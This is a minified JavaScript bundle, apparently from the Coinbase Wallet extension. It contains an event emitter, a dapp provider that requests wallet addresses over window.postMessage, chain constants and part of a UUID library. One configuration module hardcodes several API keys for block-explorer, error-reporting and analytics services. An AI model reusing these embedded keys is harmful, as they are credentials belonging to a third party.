

(function(){
  (()=>{
    "use strict";
    var e = {
        802343: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.ScopedLocalStorage = void 0;
            t.ScopedLocalStorage = class {
                constructor(e) {
                    this.scope = e
                }
                setItem(e, t) {
                    localStorage.setItem(this.scopedKey(e), t)
                }
                getItem(e) {
                    return localStorage.getItem(this.scopedKey(e))
                }
                removeItem(e) {
                    localStorage.removeItem(this.scopedKey(e))
                }
                clear() {
                    const e = this.scopedKey("")
                      , t = [];
                    for (let n = 0; n < localStorage.length; n++) {
                        const r = localStorage.key(n);
                        "string" == typeof r && r.startsWith(e) && t.push(r)
                    }
                    t.forEach((e=>localStorage.removeItem(e)))
                }
                scopedKey(e) {
                    return `${this.scope}:${e}`
                }
            }
        }
        ,
        63795: (e,t,n)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            const r = n(22699);
            function o(e, t, n) {
                try {
                    Reflect.apply(e, t, n)
                } catch (e) {
                    setTimeout((()=>{
                        throw e
                    }
                    ))
                }
            }
            class i extends r.EventEmitter {
                emit(e, ...t) {
                    let n = "error" === e;
                    const r = this._events;
                    if (void 0 !== r)
                        n = n && void 0 === r.error;
                    else if (!n)
                        return !1;
                    if (n) {
                        let e;
                        if (t.length > 0 && ([e] = t),
                        e instanceof Error)
                            throw e;
                        const n = new Error("Unhandled error." + (e ? ` (${e.message})` : ""));
                        throw n.context = e,
                        n
                    }
                    const i = r[e];
                    if (void 0 === i)
                        return !1;
                    if ("function" == typeof i)
                        o(i, this, t);
                    else {
                        const e = i.length
                          , n = function(e) {
                            const t = e.length
                              , n = new Array(t);
                            for (let r = 0; r < t; r += 1)
                                n[r] = e[r];
                            return n
                        }(i);
                        for (let r = 0; r < e; r += 1)
                            o(n[r], this, t)
                    }
                    return !0
                }
            }
            t.default = i
        }
        ,
        22699: e=>{
            var t, n = "object" == typeof Reflect ? Reflect : null, r = n && "function" == typeof n.apply ? n.apply : function(e, t, n) {
                return Function.prototype.apply.call(e, t, n)
            }
            ;
            t = n && "function" == typeof n.ownKeys ? n.ownKeys : Object.getOwnPropertySymbols ? function(e) {
                return Object.getOwnPropertyNames(e).concat(Object.getOwnPropertySymbols(e))
            }
            : function(e) {
                return Object.getOwnPropertyNames(e)
            }
            ;
            var o = Number.isNaN || function(e) {
                return e != e
            }
            ;
            function i() {
                i.init.call(this)
            }
            e.exports = i,
            e.exports.once = function(e, t) {
                return new Promise((function(n, r) {
                    function o(n) {
                        e.removeListener(t, i),
                        r(n)
                    }
                    function i() {
                        "function" == typeof e.removeListener && e.removeListener("error", o),
                        n([].slice.call(arguments))
                    }
                    _(e, t, i, {
                        once: !0
                    }),
                    "error" !== t && function(e, t, n) {
                        "function" == typeof e.on && _(e, "error", t, n)
                    }(e, o, {
                        once: !0
                    })
                }
                ))
            }
            ,
            i.EventEmitter = i,
            i.prototype._events = void 0,
            i.prototype._eventsCount = 0,
            i.prototype._maxListeners = void 0;
            var s = 10;
            function a(e) {
                if ("function" != typeof e)
                    throw new TypeError('The "listener" argument must be of type Function. Received type ' + typeof e)
            }
            function c(e) {
                return void 0 === e._maxListeners ? i.defaultMaxListeners : e._maxListeners
            }
            function u(e, t, n, r) {
                var o, i, s, u;
                if (a(n),
                void 0 === (i = e._events) ? (i = e._events = Object.create(null),
                e._eventsCount = 0) : (void 0 !== i.newListener && (e.emit("newListener", t, n.listener ? n.listener : n),
                i = e._events),
                s = i[t]),
                void 0 === s)
                    s = i[t] = n,
                    ++e._eventsCount;
                else if ("function" == typeof s ? s = i[t] = r ? [n, s] : [s, n] : r ? s.unshift(n) : s.push(n),
                (o = c(e)) > 0 && s.length > o && !s.warned) {
                    s.warned = !0;
                    var l = new Error("Possible EventEmitter memory leak detected. " + s.length + " " + String(t) + " listeners added. Use emitter.setMaxListeners() to increase limit");
                    l.name = "MaxListenersExceededWarning",
                    l.emitter = e,
                    l.type = t,
                    l.count = s.length,
                    u = l,
                    console && console.warn && console.warn(u)
                }
                return e
            }
            function l() {
                if (!this.fired)
                    return this.target.removeListener(this.type, this.wrapFn),
                    this.fired = !0,
                    0 === arguments.length ? this.listener.call(this.target) : this.listener.apply(this.target, arguments)
            }
            function d(e, t, n) {
                var r = {
                    fired: !1,
                    wrapFn: void 0,
                    target: e,
                    type: t,
                    listener: n
                }
                  , o = l.bind(r);
                return o.listener = n,
                r.wrapFn = o,
                o
            }
            function f(e, t, n) {
                var r = e._events;
                if (void 0 === r)
                    return [];
                var o = r[t];
                return void 0 === o ? [] : "function" == typeof o ? n ? [o.listener || o] : [o] : n ? function(e) {
                    for (var t = new Array(e.length), n = 0; n < t.length; ++n)
                        t[n] = e[n].listener || e[n];
                    return t
                }(o) : v(o, o.length)
            }
            function p(e) {
                var t = this._events;
                if (void 0 !== t) {
                    var n = t[e];
                    if ("function" == typeof n)
                        return 1;
                    if (void 0 !== n)
                        return n.length
                }
                return 0
            }
            function v(e, t) {
                for (var n = new Array(t), r = 0; r < t; ++r)
                    n[r] = e[r];
                return n
            }
            function _(e, t, n, r) {
                if ("function" == typeof e.on)
                    r.once ? e.once(t, n) : e.on(t, n);
                else {
                    if ("function" != typeof e.addEventListener)
                        throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type ' + typeof e);
                    e.addEventListener(t, (function o(i) {
                        r.once && e.removeEventListener(t, o),
                        n(i)
                    }
                    ))
                }
            }
            Object.defineProperty(i, "defaultMaxListeners", {
                enumerable: !0,
                get: function() {
                    return s
                },
                set: function(e) {
                    if ("number" != typeof e || e < 0 || o(e))
                        throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received ' + e + ".");
                    s = e
                }
            }),
            i.init = function() {
                void 0 !== this._events && this._events !== Object.getPrototypeOf(this)._events || (this._events = Object.create(null),
                this._eventsCount = 0),
                this._maxListeners = this._maxListeners || void 0
            }
            ,
            i.prototype.setMaxListeners = function(e) {
                if ("number" != typeof e || e < 0 || o(e))
                    throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received ' + e + ".");
                return this._maxListeners = e,
                this
            }
            ,
            i.prototype.getMaxListeners = function() {
                return c(this)
            }
            ,
            i.prototype.emit = function(e) {
                for (var t = [], n = 1; n < arguments.length; n++)
                    t.push(arguments[n]);
                var o = "error" === e
                  , i = this._events;
                if (void 0 !== i)
                    o = o && void 0 === i.error;
                else if (!o)
                    return !1;
                if (o) {
                    var s;
                    if (t.length > 0 && (s = t[0]),
                    s instanceof Error)
                        throw s;
                    var a = new Error("Unhandled error." + (s ? " (" + s.message + ")" : ""));
                    throw a.context = s,
                    a
                }
                var c = i[e];
                if (void 0 === c)
                    return !1;
                if ("function" == typeof c)
                    r(c, this, t);
                else {
                    var u = c.length
                      , l = v(c, u);
                    for (n = 0; n < u; ++n)
                        r(l[n], this, t)
                }
                return !0
            }
            ,
            i.prototype.addListener = function(e, t) {
                return u(this, e, t, !1)
            }
            ,
            i.prototype.on = i.prototype.addListener,
            i.prototype.prependListener = function(e, t) {
                return u(this, e, t, !0)
            }
            ,
            i.prototype.once = function(e, t) {
                return a(t),
                this.on(e, d(this, e, t)),
                this
            }
            ,
            i.prototype.prependOnceListener = function(e, t) {
                return a(t),
                this.prependListener(e, d(this, e, t)),
                this
            }
            ,
            i.prototype.removeListener = function(e, t) {
                var n, r, o, i, s;
                if (a(t),
                void 0 === (r = this._events))
                    return this;
                if (void 0 === (n = r[e]))
                    return this;
                if (n === t || n.listener === t)
                    0 == --this._eventsCount ? this._events = Object.create(null) : (delete r[e],
                    r.removeListener && this.emit("removeListener", e, n.listener || t));
                else if ("function" != typeof n) {
                    for (o = -1,
                    i = n.length - 1; i >= 0; i--)
                        if (n[i] === t || n[i].listener === t) {
                            s = n[i].listener,
                            o = i;
                            break
                        }
                    if (o < 0)
                        return this;
                    0 === o ? n.shift() : function(e, t) {
                        for (; t + 1 < e.length; t++)
                            e[t] = e[t + 1];
                        e.pop()
                    }(n, o),
                    1 === n.length && (r[e] = n[0]),
                    void 0 !== r.removeListener && this.emit("removeListener", e, s || t)
                }
                return this
            }
            ,
            i.prototype.off = i.prototype.removeListener,
            i.prototype.removeAllListeners = function(e) {
                var t, n, r;
                if (void 0 === (n = this._events))
                    return this;
                if (void 0 === n.removeListener)
                    return 0 === arguments.length ? (this._events = Object.create(null),
                    this._eventsCount = 0) : void 0 !== n[e] && (0 == --this._eventsCount ? this._events = Object.create(null) : delete n[e]),
                    this;
                if (0 === arguments.length) {
                    var o, i = Object.keys(n);
                    for (r = 0; r < i.length; ++r)
                        "removeListener" !== (o = i[r]) && this.removeAllListeners(o);
                    return this.removeAllListeners("removeListener"),
                    this._events = Object.create(null),
                    this._eventsCount = 0,
                    this
                }
                if ("function" == typeof (t = n[e]))
                    this.removeListener(e, t);
                else if (void 0 !== t)
                    for (r = t.length - 1; r >= 0; r--)
                        this.removeListener(e, t[r]);
                return this
            }
            ,
            i.prototype.listeners = function(e) {
                return f(this, e, !0)
            }
            ,
            i.prototype.rawListeners = function(e) {
                return f(this, e, !1)
            }
            ,
            i.listenerCount = function(e, t) {
                return "function" == typeof e.listenerCount ? e.listenerCount(t) : p.call(e, t)
            }
            ,
            i.prototype.listenerCount = p,
            i.prototype.eventNames = function() {
                return this._eventsCount > 0 ? t(this._events) : []
            }
        }
        ,
        828088: function(e, t, n) {
            var r = this && this.__importDefault || function(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            ;
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.CoinbaseWalletDappProvider = void 0;
            const o = n(802343)
              , i = r(n(63795))
              , s = n(108389)
              , a = n(53610)
              , c = n(419981)
              , u = n(410189)
              , l = n(151771)
              , d = n(719695)
              , f = n(310666);
            class p extends i.default {
                constructor() {
                    super(),
                    this.connect = this.connect.bind(this),
                    this.postWindowMessage = this.postWindowMessage.bind(this),
                    this.recieveWindowMessage = this.recieveWindowMessage.bind(this),
                    this.eventManager = new Map,
                    this.storage = new o.ScopedLocalStorage("coinbaseWallet.dappProvider"),
                    this.isConnected = "true" === this.storage.getItem("isConnected"),
                    window.addEventListener("message", this.recieveWindowMessage)
                }
                async connect() {
                    return new Promise(((e,t)=>{
                        this.postWindowMessage({
                            method: l.ExtensionConnectionRequest.getAllAddresses
                        }, (async n=>{
                            try {
                                if (!n)
                                    throw new Error("No addresses returned from extension");
                                this.isConnected = !0,
                                this.storage.setItem("isConnected", "true"),
                                this.emit("connect");
                                const t = n.account?.[s.ETHEREUM_SYMBOL] || []
                                  , r = n.account?.[a.SOLANA_SYMBOL] || [];
                                window.coinbaseWalletExtension?._setAddresses?.(t),
                                window.coinbaseSolana?._setAddresses(r),
                                e(n)
                            } catch (e) {
                                await this.disconnect(),
                                t(e)
                            }
                        }
                        ))
                    }
                    ))
                }
                async disconnect() {
                    try {
                        return this.isConnected = !1,
                        this.storage.clear(),
                        this.eventManager.clear(),
                        this.emit("disconnect"),
                        await Promise.resolve()
                    } catch (e) {
                        throw console.error(e),
                        e
                    }
                }
                postWindowMessage(e, t) {
                    const n = (0,
                    u.v4)().toString();
                    this.eventManager.set(n, t),
                    window.postMessage({
                        type: "extensionUIRequest",
                        provider: c.DAPP_PROVIDER_ID,
                        data: {
                            action: e.method,
                            request: e.params,
                            id: n,
                            dappInfo: {
                                dappLogoURL: ""
                            }
                        }
                    }, "*")
                }
                recieveWindowMessage(e) {
                    const t = e.data.type
                      , n = e.data.data
                      , r = n.id
                      , o = n.action
                      , i = this.eventManager.get(r);
                    if ("extensionUIResponse" === t)
                        if (i)
                            switch (this.eventManager.delete(r),
                            o) {
                            case d.ExtensionConnectionResponse.getAllAddressesSuccess:
                                return void i(n?.walletConnectionRes);
                            case d.ExtensionConnectionResponse.parentDisconnected:
                                return void this.disconnect();
                            default:
                                (0,
                                f.log)("CoinbaseWalletDappProvider - unknown action with id ", r, o)
                            }
                        else
                            (0,
                            f.log)("CoinbaseWalletDappProvider - no callback registered for Window Message ID: ", r, this.eventManager)
                }
            }
            t.CoinbaseWalletDappProvider = p
        },
        151771: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.ExtensionConnectionRequest = void 0,
            function(e) {
                e.getAllAddresses = "getAllAddresses"
            }(t.ExtensionConnectionRequest || (t.ExtensionConnectionRequest = {}))
        }
        ,
        719695: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.ExtensionConnectionResponse = void 0,
            function(e) {
                e.getAllAddressesSuccess = "getAllAddressesSuccess",
                e.parentDisconnected = "parentDisconnected"
            }(t.ExtensionConnectionResponse || (t.ExtensionConnectionResponse = {}))
        }
        ,
        524264: (e,t,n)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.SOLANA_RPC_URL = t.SNOWTRACE_API_KEY = t.SHOW_CCA_LOGGING = t.RELEASE_ENVIRONMENT = t.POLYGONSCAN_API_KEY = t.OPTIMISM_API_KEY = t.NODE_ENV = t.KILL_SWITCH_ENDPOINT = t.FUNCTIONAL_TEST = t.FANTOMSCAN_API_KEY = t.ETHERSCAN_API_KEY = t.DETAILED_ERRORS = t.COINBASE_PUBLIC_SPRIG_ENV_ID = t.CB_WALLET_PUBLIC_URL = t.CB_WALLET_API_URL = t.CB_WALLET_AMPLITUDE_KEY = t.CB_API_URL = t.CBPAY_ID = t.BUGSNAG_SESSIONS_ENDPOINT = t.BUGSNAG_ENDPOINT = t.BUGSNAG_API_KEY = t.BSCSCAN_API_KEY = t.ARBISCAN_API_KEY = t.ANALYTICS_DISABLE_DEBUG_LOGGING = void 0;
            const r = n(340674);
            t.ANALYTICS_DISABLE_DEBUG_LOGGING = (0,
            r.yn)("false"),
            t.ARBISCAN_API_KEY = "8EIAPIHN5S47JM7AD65UCVPGQWGZ38G7AJ",
            t.BSCSCAN_API_KEY = "T8BK2SDU3I3JXKWCFAPVRFQDHKV5MACHWC",
            t.BUGSNAG_API_KEY = "7b7f976839bca236e8d53c1de922f416",
            t.BUGSNAG_ENDPOINT = "https://exceptions.coinbase.com",
            t.BUGSNAG_SESSIONS_ENDPOINT = "https://sessions.coinbase.com",
            t.CBPAY_ID = "36b7972f-b87f-4c13-a313-1b00db0212ec",
            t.CB_API_URL = "https://api.coinbase.com",
            t.CB_WALLET_AMPLITUDE_KEY = "4b5c59547a46317aee88399fdfc8f1f3",
            t.CB_WALLET_API_URL = "https://api.wallet.coinbase.com",
            t.CB_WALLET_PUBLIC_URL = "https://wallet.coinbase.com",
            t.COINBASE_PUBLIC_SPRIG_ENV_ID = "SaAnIkWLlWzc",
            t.DETAILED_ERRORS = (0,
            r.yn)("false"),
            t.ETHERSCAN_API_KEY = "GAH6BHW1WXF3TNQ4AH3G44B7BWVVKPKSV5",
            t.FANTOMSCAN_API_KEY = "33A9K22PIJJEQT28HYD7JIWQHQ7AHC1TFF",
            t.FUNCTIONAL_TEST = "MISSING_ENV_VAR".FUNCTIONAL_TEST,
            t.KILL_SWITCH_ENDPOINT = "https://api.coinbase.com",
            t.NODE_ENV = "production",
            t.OPTIMISM_API_KEY = "3AC76IGUZCFP2ABUNPGAY8PJSPRAFJYHEF",
            t.POLYGONSCAN_API_KEY = "N1QTECUKT25H7R5H1EGHAXUIG7SRT8BUYY",
            t.RELEASE_ENVIRONMENT = "production",
            t.SHOW_CCA_LOGGING = (0,
            r.yn)("false"),
            t.SNOWTRACE_API_KEY = "S1UPXSUGI2Z7TBZN2MZCMZBW2HP3DZ1B4G",
            t.SOLANA_RPC_URL = "https://sol-mainnet.wallet.coinbase.com"
        }
        ,
        713403: (e,t,n)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.isProd = void 0;
            const r = n(524264);
            t.isProd = function() {
                return "production" === r.NODE_ENV
            }
        }
        ,
        310666: (e,t,n)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.log = void 0;
            const r = n(713403);
            t.log = function(...e) {
                (0,
                r.isProd)() || console.log(...e)
            }
        }
        ,
        419981: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.DAPP_PROVIDER_ID = void 0,
            t.DAPP_PROVIDER_ID = "window.coinbaseWallet.dappProvider"
        }
        ,
        108389: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.POLYGON_CHAIN_ID = t.ETHEREUM_CHAIN_ID = t.BURN_ADDRESS = t.ETHEREUM_QR_CODE_MAINNET_SCHEME = t.ETHEREUM_CURRENCY_DECIMAL = t.ETHEREUM_SYMBOL = t.ETHEREUM_PREFIX = void 0,
            t.ETHEREUM_PREFIX = "ETHEREUM_CHAIN",
            t.ETHEREUM_SYMBOL = "ETH",
            t.ETHEREUM_CURRENCY_DECIMAL = 18n,
            t.ETHEREUM_QR_CODE_MAINNET_SCHEME = "ethereum",
            t.BURN_ADDRESS = "0x000000000000000000000000000000000000dead",
            t.ETHEREUM_CHAIN_ID = 1n,
            t.POLYGON_CHAIN_ID = 137n
        }
        ,
        53610: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.LAMPORT_CURRENCY = t.SOLANA_CURRENCY_DECIMAL = t.BLOCKCHAIN_SOLANA_MAINNET_IMAGE_URL = t.LAMPORTS_PER_SOL = t.SOLANA_SYMBOL = t.NAME = void 0,
            t.NAME = "Solana",
            t.SOLANA_SYMBOL = "SOL",
            t.LAMPORTS_PER_SOL = 1000000000n,
            t.BLOCKCHAIN_SOLANA_MAINNET_IMAGE_URL = "https://assets.coingecko.com/coins/images/4128/small/Solana.jpg?1635329178",
            t.SOLANA_CURRENCY_DECIMAL = 9n,
            t.LAMPORT_CURRENCY = "lamport"
        }
        ,
        340674: (e,t)=>{
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.yn = void 0,
            t.yn = function(e) {
                if (null == e)
                    return !1;
                const t = String(e).trim();
                return !!/^(?:y|yes|true|1|on)$/i.test(t)
            }
        }
        ,
        410189: (e,t,n)=>{
            n.r(t),
            n.d(t, {
                NIL: ()=>N,
                parse: ()=>d,
                stringify: ()=>s.Z,
                v1: ()=>u,
                v3: ()=>I,
                v4: ()=>g.Z,
                v5: ()=>m,
                validate: ()=>l.Z,
                version: ()=>S
            });
            var r, o, i = n(45302), s = n(120708), a = 0, c = 0;
            const u = function(e, t, n) {
                var u = t && n || 0
                  , l = t || new Array(16)
                  , d = (e = e || {}).node || r
                  , f = void 0 !== e.clockseq ? e.clockseq : o;
                if (null == d || null == f) {
                    var p = e.random || (e.rng || i.Z)();
                    null == d && (d = r = [1 | p[0], p[1], p[2], p[3], p[4], p[5]]),
                    null == f && (f = o = 16383 & (p[6] << 8 | p[7]))
                }
                var v = void 0 !== e.msecs ? e.msecs : Date.now()
                  , _ = void 0 !== e.nsecs ? e.nsecs : c + 1
                  , h = v - a + (_ - c) / 1e4;
                if (h < 0 && void 0 === e.clockseq && (f = f + 1 & 16383),
                (h < 0 || v > a) && void 0 === e.nsecs && (_ = 0),
                _ >= 1e4)
                    throw new Error("uuid.v1(): Can't create more than 10M uuids/sec");
                a = v,
                c = _,
                o = f;
                var E = (1e4 * (268435455 & (v += 122192928e5)) + _) % 4294967296;
                l[u++] = E >>> 24 & 255,
                l[u++] = E >>> 16 & 255,
                l[u++] = E >>> 8 & 255,
                l[u++] = 255 & E;
                var A = v / 4294967296 * 1e4 & 268435455;
                l[u++] = A >>> 8 & 255,
                l[u++] = 255 & A,
                l[u++] = A >>> 24 & 15 | 16,
                l[u++] = A >>> 16 & 255,
                l[u++] = f >>> 8 | 128,
                l[u++] = 255 & f;
                for (var y = 0; y < 6; ++y)
                    l[u + y] = d[y];
                return t || (0,
                s.Z)(l)
            };
            var l = n(858495);
            const d = function(e) {
                if (!(0,
                l.Z)(e))
                    throw TypeError("Invalid UUID");
                var t, n = new Uint8Array(16);
                return n[0] = (t = parseInt(e.slice(0, 8), 16)) >>> 24,
                n[1] = t >>> 16 & 255,
                n[2] = t >>> 8 & 255,
                n[3] = 255 & t,
                n[4] = (t = parseInt(e.slice(9, 13), 16)) >>> 8,
                n[5] = 255 & t,
                n[6] = (t = parseInt(e.slice(14, 18), 16)) >>> 8,
                n[7] = 255 & t,
                n[8] = (t = parseInt(e.slice(19, 23), 16)) >>> 8,
                n[9] = 255 & t,
                n[10] = (t = parseInt(e.slice(24, 36), 16)) / 1099511627776 & 255,
                n[11] = t / 4294967296 & 255,
                n[12] = t >>> 24 & 255,
                n[13] = t >>> 16 & 255,
                n[14] = t >>> 8 & 255,
                n[15] = 255 & t,
                n
            };
            function f(e, t, n) {
                function r(e, r, o, i) {
                    if ("string" == typeof e && (e = function(e) {
                        e = unescape(encodeURIComponent(e));
                        for (var t = [], n = 0; n < e.length; ++n)
                            t.push(e.charCodeAt(n));
                        return t
                    }(e)),
                    "string" == typeof r && (r = d(r)),
                    16 !== r.length)
                        throw TypeError("Namespace must be array-like (16 iterable integer values, 0-255)");
                    var a = new Uint8Array(16 + e.length);
                    if (a.set(r),
                    a.set(e, r.length),
                    (a = n(a))[6] = 15 & a[6] | t,
                    a[8] = 63 & a[8] | 128,
                    o) {
                        i = i || 0;
                        for (var c = 0; c < 16; ++c)
                            o[i + c] = a[c];
                        return o
                    }
                    return (0,
                    s.Z)(a)
                }
                try {
                    r.name = e
                } catch (e) {}
                return r.DNS = "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
                r.URL = "6ba7b811-9dad-11d1-80b4-00c04fd430c8",
                r
            }
            function p(e) {
                return 14 + (e + 64 >>> 9 << 4) + 1
            }
            function v(e, t) {
                var n = (65535 & e) + (65535 & t);
                return (e >> 16) + (t >> 16) + (n >> 16) << 16 | 65535 & n
            }
            function _(e, t, n, r, o, i) {
                return v((s = v(v(t, e), v(r, i))) << (a = o) | s >>> 32 - a, n);
                var s, a
            }
            function h(e, t, n, r, o, i, s) {
                return _(t & n | ~t & r, e, t, o, i, s)
            }
            function E(e, t, n, r, o, i, s) {
                return _(t & r | n & ~r, e, t, o, i, s)
            }
            function A(e, t, n, r, o, i, s) {
                return _(t ^ n ^ r, e, t, o, i, s)
            }
            function y(e, t, n, r, o, i, s) {
                return _(n ^ (t | ~r), e, t, o, i, s)
            }
            const I = f("v3", 48, (function(e) {
                if ("string" == typeof e) {
                    var t = unescape(encodeURIComponent(e));
                    e = new Uint8Array(t.length);
                    for (var n = 0; n < t.length; ++n)
                        e[n] = t.charCodeAt(n)
                }
                return function(e) {
                    for (var t = [], n = 32 * e.length, r = "0123456789abcdef", o = 0; o < n; o += 8) {
                        var i = e[o >> 5] >>> o % 32 & 255
                          , s = parseInt(r.charAt(i >>> 4 & 15) + r.charAt(15 & i), 16);
                        t.push(s)
                    }
                    return t
                }(function(e, t) {
                    e[t >> 5] |= 128 << t % 32,
                    e[p(t) - 1] = t;
                    for (var n = 1732584193, r = -271733879, o = -1732584194, i = 271733878, s = 0; s < e.length; s += 16) {
                        var a = n
                          , c = r
                          , u = o
                          , l = i;
                        n = h(n, r, o, i, e[s], 7, -680876936),
                        i = h(i, n, r, o, e[s + 1], 12, -389564586),
                        o = h(o, i, n, r, e[s + 2], 17, 606105819),
                        r = h(r, o, i, n, e[s + 3], 22, -1044525330),
                        n = h(n, r, o, i, e[s + 4], 7, -176418897),
                        i = h(i, n, r, o, e[s + 5], 12, 1200080426),
                        o = h(o, i, n, r, e[s + 6], 17, -1473231341),
                        r = h(r, o, i, n, e[s + 7], 22, -45705983),
                        n = h(n, r, o, i, e[s + 8], 7, 1770035416),
                        i = h(i, n, r, o, e[s + 9], 12, -1958414417),
                        o = h(o, i, n, r, e[s + 10], 17, -42063),
                        r = h(r, o, i, n, e[s + 11], 22, -1990404162),
                        n = h(n, r, o, i, e[s + 12], 7, 1804603682),
                        i = h(i, n, r, o, e[s + 13], 12, -40341101),
                        o = h(o, i, n, r, e[s + 14], 17, -1502002290),
                        n = E(n, r = h(r, o, i, n, e[s + 15], 22, 1236535329), o, i, e[s + 1], 5, -165796510),
                        i = E(i, n, r, o, e[s + 6], 9, -1069501632),
                        o = E(o, i, n, r, e[s + 11], 14, 643717713),
                        r = E(r, o, i, n, e[s], 20, -373897302),
                        n = E(n, r, o, i, e[s + 5], 5, -701558691),
                        i = E(i, n, r, o, e[s + 10], 9, 38016083),
                        o = E(o, i, n, r, e[s + 15], 14, -660478335),
                        r = E(r, o, i, n, e[s + 4], 20, -405537848),
                        n = E(n, r, o, i, e[s + 9], 5, 568446438),
                        i = E(i, n, r, o, e[s + 14], 9, -1019803690),
                        o = E(o, i, n, r, e[s + 3], 14, -187363961),
                        r = E(r, o, i, n, e[s + 8], 20, 1163531501),
                        n = E(n, r, o, i, e[s + 13], 5, -1444681467),
                        i = E(i, n, r, o, e[s + 2], 9, -51403784),
                        o = E(o, i, n, r, e[s + 7], 14, 1735328473),
                        n = A(n, r = E(r, o, i, n, e[s + 12], 20, -1926607734), o, i, e[s + 5], 4, -378558),
                        i = A(i, n, r, o, e[s + 8], 11, -2022574463),
                        o = A(o, i, n, r, e[s + 11], 16, 1839030562),
                        r = A(r, o, i, n, e[s + 14], 23, -35309556),
                        n = A(n, r, o, i, e[s + 1], 4, -1530992060),
                        i = A(i, n, r, o, e[s + 4], 11, 1272893353),
                        o = A(o, i, n, r, e[s + 7], 16, -155497632),
                        r = A(r, o, i, n, e[s + 10], 23, -1094730640),
                        n = A(n, r, o, i, e[s + 13], 4, 681279174),
                        i = A(i, n, r, o, e[s], 11, -358537222),
                        o = A(o, i, n, r, e[s + 3], 16, -722521979),
                        r = A(r, o, i, n, e[s + 6], 23, 76029189),
                        n = A(n, r, o, i, e[s + 9], 4, -640364487),
                        i = A(i, n, r, o, e[s + 12], 11, -421815835),
                        o = A(o, i, n, r, e[s + 15], 16, 530742520),
                        n = y(n, r = A(r, o, i, n, e[s + 2], 23, -995338651), o, i, e[s], 6, -198630844),
                        i = y(i, n, r, o, e[s + 7], 10, 1126891415),
                        o = y(o, i, n, r, e[s + 14], 15, -1416354905),
                        r = y(r, o, i, n, e[s + 5], 21, -57434055),
                        n = y(n, r, o, i, e[s + 12], 6, 1700485571),
                        i = y(i, n, r, o, e[s + 3], 10, -1894986606),
                        o = y(o, i, n, r, e[s + 10], 15, -1051523),
                        r = y(r, o, i, n, e[s + 1], 21, -2054922799),
                        n = y(n, r, o, i, e[s + 8], 6, 1873313359),
                        i = y(i, n, r, o, e[s + 15], 10, -30611744),
                        o = y(o, i, n, r, e[s + 6], 15, -1560198380),
                        r = y(r, o, i, n, e[s + 13], 21, 1309151649),
                        n = y(n, r, o, i, e[s + 4], 6, -145523070),
                        i = y(i, n, r, o, e[s + 11], 10, -1120210379),
                        o = y(o, i, n, r, e[s + 2], 15, 718787259),
                        r = y(r, o, i, n, e[s + 9], 21, -343485551),
                        n = v(n, a),
                        r = v(r, c),
                        o = v(o, u),
                        i = v(i, l)
                    }
                    return [n, r, o, i]
                }(function(e) {
                    if (0 === e.length)
                        return [];
                    for (var t = 8 * e.length, n = new Uint32Array(p(t)), r = 0; r < t; r += 8)
                        n[r >> 5] |= (255 & e[r / 8]) << r % 32;
                    return n
                }(e), 8 * e.length))
            }
            ));
            var g = n(888767);
            function L(e, t, n, r) {
                switch (e) {
                case 0:
                    return t & n ^ ~t & r;
                case 1:
                case 3:
                    return t ^ n ^ r;
                case 2:
                    return t & n ^ t & r ^ n & r
                }
            }
            function C(e, t) {
                return e << t | e >>> 32 - t
            }
            const m = f("v5", 80, (function(e) {
                var t = [1518500249, 1859775393, 2400959708, 3395469782]
                  , n = [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
                if ("string" == typeof e) {
                    var r = unescape(encodeURIComponent(e));
                    e = [];
                    for (var o = 0; o < r.length; ++o)
                        e.push(r.charCodeAt(o))
                } else
                    Array.isArray(e) || (e = Array.prototype.slice.call(e));
                e.push(128);
                for (var i = e.length / 4 + 2, s = Math.ceil(i / 16), a = new Array(s), c = 0; c < s; ++c) {
                    for (var u = new Uint32Array(16), l = 0; l < 16; ++l)
                        u[l] = e[64 * c + 4 * l] << 24 | e[64 * c + 4 * l + 1] << 16 | e[64 * c + 4 * l + 2] << 8 | e[64 * c + 4 * l + 3];
                    a[c] = u
                }
                a[s - 1][14] = 8 * (e.length - 1) / Math.pow(2, 32),
                a[s - 1][14] = Math.floor(a[s - 1][14]),
                a[s - 1][15] = 8 * (e.length - 1) & 4294967295;
                for (var d = 0; d < s; ++d) {
                    for (var f = new Uint32Array(80), p = 0; p < 16; ++p)
                        f[p] = a[d][p];
                    for (var v = 16; v < 80; ++v)
                        f[v] = C(f[v - 3] ^ f[v - 8] ^ f[v - 14] ^ f[v - 16], 1);
                    for (var _ = n[0], h = n[1], E = n[2], A = n[3], y = n[4], I = 0; I < 80; ++I) {
                        var g = Math.floor(I / 20)
                          , m = C(_, 5) + L(g, h, E, A) + y + t[g] + f[I] >>> 0;
                        y = A,
                        A = E,
                        E = C(h, 30) >>> 0,
                        h = _,
                        _ = m
                    }
                    n[0] = n[0] + _ >>> 0,
                    n[1] = n[1] + h >>> 0,
                    n[2] = n[2] + E >>> 0,
                    n[3] = n[3] + A >>> 0,
                    n[4] = n[4] + y >>> 0
                }
                return [n[0] >> 24 & 255, n[0] >> 16 & 255, n[0] >> 8 & 255, 255 & n[0], n[1] >> 24 & 255, n[1] >> 16 & 255, n[1] >> 8 & 255, 255 & n[1], n[2] >> 24 & 255, n[2] >> 16 & 255, n[2] >> 8 & 255, 255 & n[2], n[3] >> 24 & 255, n[3] >> 16 & 255, n[3] >> 8 & 255, 255 & n[3], n[4] >> 24 & 255, n[4] >> 16 & 255, n[4] >> 8 & 255, 255 & n[4]]
            }
            ))
              , N = "00000000-0000-0000-0000-000000000000";
